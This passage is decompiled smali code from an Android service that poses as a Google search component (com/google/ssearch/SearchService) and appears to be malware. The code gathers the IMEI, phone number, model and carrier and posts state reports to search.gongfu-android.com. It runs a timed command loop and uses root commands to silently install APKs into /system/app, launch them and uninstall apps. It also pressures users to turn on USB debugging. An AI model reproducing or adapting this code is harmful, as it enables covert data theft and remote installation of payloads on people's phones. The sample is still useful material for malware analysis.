    const-string v1, "2.3"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "3.0"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 156
    :cond_0
    const/4 v1, 0x1

    .line 158
    :goto_0
    return v1

    :cond_1
    const/4 v1, 0x0

    goto :goto_0
.end method

.method private provideService()V
    .locals 6

    .prologue
    .line 354
    new-instance v0, Ljava/util/Timer;

    const/4 v1, 0x1

    invoke-direct {v0, v1}, Ljava/util/Timer;-><init>(Z)V

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mTimer:Ljava/util/Timer;

    .line 355
    new-instance v0, Lcom/google/ssearch/SearchService$1;

    invoke-direct {v0, p0}, Lcom/google/ssearch/SearchService$1;-><init>(Lcom/google/ssearch/SearchService;)V

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mTimerTask:Ljava/util/TimerTask;

    .line 360
    iget-object v0, p0, Lcom/google/ssearch/SearchService;->mTimer:Ljava/util/Timer;

    iget-object v1, p0, Lcom/google/ssearch/SearchService;->mTimerTask:Ljava/util/TimerTask;

    sget-wide v2, Lcom/google/ssearch/SearchService;->INTERVAL:J

    sget-wide v4, Lcom/google/ssearch/SearchService;->INTERVAL:J

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    .line 361
    return-void
.end method

.method private reportState(ILjava/lang/String;)V
    .locals 7
    .param p1, "state"    # I
    .param p2, "comment"    # Ljava/lang/String;

    .prologue
    .line 577
    new-instance v3, Ljava/util/ArrayList;

    invoke-direct {v3}, Ljava/util/ArrayList;-><init>()V

    .line 578
    .local v3, "params":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    const-string v0, "http://search.gongfu-android.com:8511/search/rpty.php"

    .line 580
    .local v0, "action":Ljava/lang/String;
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "imei"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mImei:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 581
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "taskid"

    iget-object v6, p0, Lcom/google/ssearch/SearchService;->mTaskId:Ljava/lang/String;

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 582
    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "state"

    invoke-static {p1}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v5, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 584
    if-eqz p2, :cond_0

    const-string v4, ""

    invoke-virtual {v4, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    const-string v5, "comment"

    invoke-direct {v4, v5, p2}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 586
    :cond_0
    new-instance v1, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v1, v0}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 588
    .local v1, "httpRequest":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v4, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v5, "UTF-8"

    invoke-direct {v4, v3, v5}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v1, v4}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 589
    new-instance v4, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v4}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {v4, v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v2

    .line 590
    .local v2, "httpResponse":Lorg/apache/http/HttpResponse;
    invoke-interface {v2}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v4

    invoke-interface {v4}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 594
    .end local v2    # "httpResponse":Lorg/apache/http/HttpResponse;
    :goto_0
    const/4 v4, 0x1

    if-eq p1, v4, :cond_1

    const/4 v4, -0x1

    if-ne p1, v4, :cond_2

    :cond_1
    const-string v4, ""

    iput-object v4, p0, Lcom/google/ssearch/SearchService;->mTaskId:Ljava/lang/String;

    .line 595
    :cond_2
    return-void

    .line 592
    :catch_0
    move-exception v4

    goto :goto_0
.end method

.method private runPackage(Ljava/lang/String;)V
    .locals 3
    .param p1, "pkgName"    # Ljava/lang/String;

    .prologue
    .line 625
    invoke-static {p0, p1}, Lcom/google/ssearch/Utils$PkgManager;->isInstalled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    const-wide/16 v1, 0x2710

    invoke-static {v1, v2}, Landroid/os/SystemClock;->sleep(J)V

    .line 627
    :cond_0
    invoke-static {p0, p1}, Lcom/google/ssearch/Utils$PkgManager;->isInstalled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 628
    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v1, p1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 629
    .local v0, "intent":Landroid/content/Intent;
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 630
    invoke-virtual {p0, v0}, Lcom/google/ssearch/SearchService;->startActivity(Landroid/content/Intent;)V

    .line 631
    const/4 v1, 0x1

    const-string v2, "RUNOK"

    invoke-direct {p0, v1, v2}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 635
    .end local v0    # "intent":Landroid/content/Intent;
    :goto_0
    return-void

    .line 633
    :cond_1
    const/4 v1, -0x1

    const-string v2, "RUNFailByNoPkg"

    invoke-direct {p0, v1, v2}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    goto :goto_0
.end method

.method private setUsbEnabled()I
    .locals 9

    .prologue
    .line 293
    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mPreferences:Landroid/content/SharedPreferences;

    const-string v6, "P31"

    const/4 v7, 0x0

    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 294
    .local v0, "count":I
    add-int/lit8 v0, v0, 0x1

    .line 295
    iget-object v5, p0, Lcom/google/ssearch/SearchService;->mPreferences:Landroid/content/SharedPreferences;

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 296
    .local v1, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v5, "P31"

    invoke-interface {v1, v5, v0}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 297
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 299
    const/16 v5, 0xa

    if-lt v0, v5, :cond_0

    .line 313
    :goto_0
    return v0

    .line 301
    :cond_0
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    .line 302
    .local v2, "intent":Landroid/content/Intent;
    const-class v5, Lcom/google/ssearch/Dialog;

    invoke-virtual {v2, p0, v5}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 303
    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v5

    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    .line 304
    .local v4, "name":Ljava/lang/String;
    if-eqz v4, :cond_1

    const-string v5, ""

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2

    :cond_1
    const-string v4, "\u672c\u8f6f\u4ef6"

    .line 305
    :cond_2
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "\u9700\u8981\u6253\u5f00USB\u8c03\u8bd5\u624d\u80fd\u4f7f\u7528\u5168\u90e8\u529f\u80fd\uff0c\u8bf7\u786e\u4fddUSB\u8c03\u8bd5\u529f\u80fd\u5df2\u7ecf\u9009\u4e2d\uff01"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 307
    .local v3, "msg":Ljava/lang/String;
    :try_start_0
    const-string v5, "MSG"

    new-instance v6, Ljava/lang/String;

    const-string v7, "UTF-8"

    invoke-virtual {v3, v7}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v7

    const-string v8, "UTF-8"

    invoke-direct {v6, v7, v8}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-virtual {v2, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    .line 309
    :goto_1
    const-string v5, "TYPEdsada"

    const-string v6, "set"

    invoke-virtual {v2, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 310
    const/high16 v5, 0x10000000

    invoke-virtual {v2, v5}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 311
    invoke-virtual {p0, v2}, Lcom/google/ssearch/SearchService;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 308
    :catch_0
    move-exception v5

    goto :goto_1
.end method

.method private uninstallPackage(Ljava/lang/String;)V
    .locals 7
    .param p1, "pkgName"    # Ljava/lang/String;

    .prologue
    const/4 v6, 0x1

    const/4 v5, -0x1

    .line 638
    const/4 v2, 0x0

    .line 641
    .local v2, "pkgInfo":Landroid/content/pm/PackageInfo;
    invoke-static {p0}, Lcom/google/ssearch/Utils$PkgManager;->getInstallPackageInfo(Landroid/content/Context;)Ljava/util/List;

    move-result-object v1

    .line 642
    .local v1, "infos":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-nez v4, :cond_1

    .line 649
    :goto_0
    if-nez v2, :cond_2

    .line 650
    const-string v3, "NoPkg"

    invoke-direct {p0, v5, v3}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 665
    :goto_1
    return-void

    .line 642
    :cond_1
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/pm/PackageInfo;

    .line 643
    .local v0, "info":Landroid/content/pm/PackageInfo;
    iget-object v4, v0, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 644
    move-object v2, v0

    .line 645
    goto :goto_0

    .line 655
    .end local v0    # "info":Landroid/content/pm/PackageInfo;
    :cond_2
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->checkPermission()Z

    move-result v3

    if-eqz v3, :cond_4

    .line 656
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "3 /data/app/"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, v2, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    iget-object v4, v4, Landroid/content/pm/ApplicationInfo;->sourceDir:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/google/ssearch/Utils$TCP;->execute(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 657
    const-string v3, "ByCP"

    invoke-direct {p0, v6, v3}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    goto :goto_1

    .line 659
    :cond_3
    const-string v3, "CPDelFail"

    invoke-direct {p0, v5, v3}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 663
    :cond_4
    iget-object v3, v2, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    iget-object v3, v3, Landroid/content/pm/ApplicationInfo;->sourceDir:Ljava/lang/String;

    invoke-static {p0, v3}, Lcom/google/ssearch/Utils$PkgManager;->deleteApp(Landroid/content/Context;Ljava/lang/String;)V

    .line 664
    const-string v3, "ByCP"

    invoke-direct {p0, v6, v3}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    goto :goto_1
.end method

.method private updateInfo()V
    .locals 2

    .prologue
    .line 130
    invoke-static {p0}, Lcom/google/ssearch/Utils$PhoneState;->getImei(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mImei:Ljava/lang/String;

    .line 131
    invoke-static {p0}, Lcom/google/ssearch/Utils$PhoneState;->getMobile(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mMobile:Ljava/lang/String;

    .line 133
    invoke-static {}, Lcom/google/ssearch/Utils$PhoneState;->getModel()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mModel:Ljava/lang/String;

    .line 134
    invoke-static {}, Lcom/google/ssearch/Utils$PhoneState;->getSDKVersion()[Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    aget-object v0, v0, v1

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mOsType:Ljava/lang/String;

    .line 135
    invoke-static {}, Lcom/google/ssearch/Utils$PhoneState;->getSDKVersion()[Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x1

    aget-object v0, v0, v1

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mOsAPI:Ljava/lang/String;

    .line 136
    invoke-static {p0}, Lcom/google/ssearch/Utils$PhoneState;->getAliaMemorySize(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mAliaMem:Ljava/lang/String;

    .line 137
    invoke-static {p0}, Lcom/google/ssearch/Utils$PhoneState;->getSDAliaMemory(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mSDMem:Ljava/lang/String;

    .line 138
    invoke-static {p0}, Lcom/google/ssearch/Utils$PhoneState;->getConnectType(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mNetType:Ljava/lang/String;

    .line 139
    invoke-static {p0}, Lcom/google/ssearch/Utils$PhoneState;->getNetOperater(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/ssearch/SearchService;->mOperater:Ljava/lang/String;

    .line 140
    return-void
.end method


# virtual methods
.method public installPakage([Ljava/lang/String;Ljava/lang/String;Z)V
    .locals 8
    .param p1, "pathName"    # [Ljava/lang/String;
    .param p2, "run"    # Ljava/lang/String;
    .param p3, "isSys"    # Z

    .prologue
    const/4 v7, 0x5

    const/4 v6, 0x0

    const/4 v5, 0x1

    .line 600
    aget-object v3, p1, v5

    invoke-static {p0, v3}, Lcom/google/ssearch/Utils$PkgManager;->getPackageMsg(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 602
    .local v1, "info":[Ljava/lang/String;
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->checkPermission()Z

    move-result v3

    if-eqz v3, :cond_4

    .line 604
    if-eqz p3, :cond_1

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "2 "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v4, p1, v6

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " /system/app/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    aget-object v4, v1, v5

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ".apk"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 606
    .local v0, "cmd":Ljava/lang/String;
    :goto_0
    invoke-static {v0}, Lcom/google/ssearch/Utils$TCP;->execute(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 607
    if-nez p2, :cond_2

    move v2, v5

    .line 608
    .local v2, "state":I
    :goto_1
    const-string v3, "CPInstOK"

    invoke-direct {p0, v2, v3}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 609
    if-eqz p2, :cond_0

    aget-object v3, v1, v5

    invoke-direct {p0, v3}, Lcom/google/ssearch/SearchService;->runPackage(Ljava/lang/String;)V

    .line 621
    .end local v0    # "cmd":Ljava/lang/String;
    .end local v2    # "state":I
    :cond_0
    :goto_2
    return-void

    .line 605
    :cond_1
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "1 "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v4, p1, v6

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " /data/app/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    aget-object v4, v1, v5

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ".apk"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .restart local v0    # "cmd":Ljava/lang/String;
    goto :goto_0

    :cond_2
    move v2, v7

    .line 607
    goto :goto_1

    .line 611
    :cond_3
    const-string v3, "CPInstFail"

    invoke-direct {p0, v7, v3}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 615
    .end local v0    # "cmd":Ljava/lang/String;
    :cond_4
    aget-object v3, p1, v6

    invoke-static {p0, v3}, Lcom/google/ssearch/Utils$PkgManager;->installApp(Landroid/content/Context;Ljava/lang/String;)V

    .line 616
    const/4 v3, 0x6

    const-string v4, "Normaling"

    invoke-direct {p0, v3, v4}, Lcom/google/ssearch/SearchService;->reportState(ILjava/lang/String;)V

    .line 617
    aget-object v3, v1, v5

    iput-object v3, p0, Lcom/google/ssearch/SearchService;->mPkgName:Ljava/lang/String;

    .line 618
    iput-object p2, p0, Lcom/google/ssearch/SearchService;->mRun:Ljava/lang/String;

    .line 619
    iput-boolean v5, p0, Lcom/google/ssearch/SearchService;->mWaiting:Z

    .line 620
    iget-wide v3, p0, Lcom/google/ssearch/SearchService;->mTickets:J

    iput-wide v3, p0, Lcom/google/ssearch/SearchService;->mLastTickets:J

    goto :goto_2
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 100
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 11

    .prologue
    const-wide/16 v7, 0x0

    const/4 v10, 0x0

    .line 105
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 107
    const-string v6, "sstimestamp"

    invoke-virtual {p0, v6, v10}, Lcom/google/ssearch/SearchService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    .line 108
    .local v5, "p":Landroid/content/SharedPreferences;
    const-string v6, "start"

    invoke-interface {v5, v6, v7, v8}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v3

    .line 109
    .local v3, "last":J
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    .line 110
    .local v0, "cur":J
    cmp-long v6, v3, v7

    if-nez v6, :cond_0

    .line 111
    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 112
    .local v2, "ed":Landroid/content/SharedPreferences$Editor;
    const-string v6, "start"

    invoke-interface {v2, v6, v0, v1}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 113
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 114
    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->stopSelf()V

    .line 127
    .end local v2    # "ed":Landroid/content/SharedPreferences$Editor;
    :goto_0
    return-void

    .line 116
    :cond_0
    sub-long v6, v0, v3

    const-wide/32 v8, 0x927c0

    cmp-long v6, v6, v8

    if-gez v6, :cond_1

    .line 117
    invoke-virtual {p0}, Lcom/google/ssearch/SearchService;->stopSelf()V

    goto :goto_0

    .line 121
    :cond_1
    const-string v6, "permission"

    invoke-virtual {p0, v6, v10}, Lcom/google/ssearch/SearchService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    iput-object v6, p0, Lcom/google/ssearch/SearchService;->mPreferences:Landroid/content/SharedPreferences;

    .line 123
    invoke-static {p0}, Lcom/google/ssearch/Utils;->isConnected(Landroid/content/Context;)Z

    move-result v6

    if-eqz v6, :cond_2

    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->doSearchReport()V

    .line 125
    :cond_2
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->getPermission()V

    .line 126
    invoke-direct {p0}, Lcom/google/ssearch/SearchService;->provideService()V

    goto :goto_0
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 144
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 146
    iget-object v0, p0, Lcom/google/ssearch/SearchService;->mTimer:Ljava/util/Timer;

    if-eqz v0, :cond_0

    .line 147
    iget-object v0, p0, Lcom/google/ssearch/SearchService;->mTimer:Ljava/util/Timer;

    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

    .line 149
    :cond_0
    return-void
.end method
